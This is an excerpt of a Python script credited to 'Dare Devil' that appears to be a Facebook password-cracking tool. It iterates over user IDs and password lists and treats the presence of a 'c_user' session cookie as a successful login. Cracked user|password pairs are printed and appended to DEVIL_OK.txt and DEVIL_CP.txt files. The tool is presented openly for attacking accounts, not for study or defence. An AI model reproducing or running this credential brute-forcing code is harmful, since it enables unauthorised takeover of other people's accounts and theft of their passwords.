...
\033[0;91mAUTHOR   : Dare Devil

 

\033[0;93mFACEBOOK : Dare Devil

 

\033[0;96mGITHUB   : Daredevil.git
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mDEVIL_OK.txt' % (H, P, str(len(ok))))

	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91DEVIL_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r\x1b[1;92m[DEVIL] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s[DEVIL-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('DEVIL_CP.txt' , 'a').write('%s\n' % wrt)
